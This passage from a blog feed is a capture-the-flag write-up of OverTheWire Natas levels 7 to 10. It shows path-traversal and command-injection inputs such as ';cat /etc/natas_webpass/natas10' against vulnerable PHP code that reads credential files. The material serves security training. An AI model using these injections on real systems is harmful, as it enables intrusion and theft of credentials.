-&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?page=about&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;About&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-this is the about page
-
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Ok, we have this hint. Let's try to break this system and get access to /etc/natas_webpass/natas8&lt;/p&gt;
-
-&lt;p&gt;Actualy I didn't have to break it, simple entering this in URL like &lt;b&gt;index.php?page=/etc/natas_webpass/natas8&lt;/b&gt; allowed me to view the file. &lt;/p&gt;
-
-&lt;pre&gt;
-***********************
-&lt;/pre&gt;
-
-&lt;h1&gt;8&lt;/h1&gt;
-
-&lt;p&gt;Another level, another form.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3d3d516343746d4d6d6c315669563362&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encodeSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin2hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strrev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodeSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'secret'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Access granted. The password for natas9 is &amp;lt;censored&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wrong secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Let's break down this process - firstly script takes input entered in form, then with function &lt;b&gt;encodeSecret&lt;/b&gt; it converts binary to hex, reverses this string and encodes with base64. What we have to do here is to reverse this process, which can be done with php. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@w3ndige ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php -r &lt;span class=&quot;s1&quot;&gt;'echo base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c315669563362&quot;)));'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This one liner produces the correct secret, which after entering into the form gives pass to the nex level. &lt;/p&gt;
-
-&lt;pre&gt;
-Access granted. The password for natas9 is ***********************
-&lt;/pre&gt;
-
-&lt;h1&gt;9&lt;/h1&gt;
-
-&lt;p&gt;This time we have something new - form searching in an dictionary. Let's check the source code. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;grep -i &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; dictionary.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Actually, what this script does is very dangerous. We know that grep is command line function searching through the text files. But what, if we have entered semicolon and then another command? Acutally, you can see it working by entering &lt;b&gt;;ls- la&lt;/b&gt; in search form.  &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;-rw-r----- 1 natas9 natas9 460878 Jun 25  2016 dictionary.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, lets view the password by entering ;cat /etc/natas_webpass/natas10/, as it's also location of all passwords, which was stated in the beginning. &lt;/p&gt;
-
-&lt;pre&gt;
-Output:
-***********************
-
-African
-Africans
-Allah
-Allah's
-&lt;/pre&gt;
-
-&lt;p&gt;Let's move to the next one!&lt;/p&gt;
-
-&lt;h1&gt;10&lt;/h1&gt;
-
-&lt;p&gt;This time we have the updated version of the script from the last one, filtering for certain characters.  &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;?
-&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array_key_exists&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; !&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;preg_match&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/[;|&amp;amp;]/'&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        print &lt;span class=&quot;s2&quot;&gt;&quot;Input contains an illegal character!&quot;&lt;/span&gt;;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        passthru&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;grep -i &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; dictionary.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We have to find the way to execute this commands in a different way. And actually, after learning a lot about PHP I remembered that &lt;b&gt;.&lt;/b&gt; concatenates 2 strings. So let's do this: &lt;b&gt;. /etc/natas_webpass/natas11&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;Which actually produces the output! I tried to do this also with HTML entities firstly, but unfortunately it did not work out.  &lt;/p&gt;
-
-&lt;pre&gt;
-/etc/natas_webpass/natas11:***********************
-dictionary.txt:African
-dictionary.txt:Africans
-dictionary.txt:Allah
-dictionary.txt:Allah's
-&lt;/pre&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;And that's the point where I had to end this part of Natas exercises. I'll come back soon with another part, as they are really interesting and completely different from others at OverTheWire. &lt;/p&gt;
-
-&lt;p&gt;See you in the next one!&lt;/p&gt;
 
 &lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry></feed>
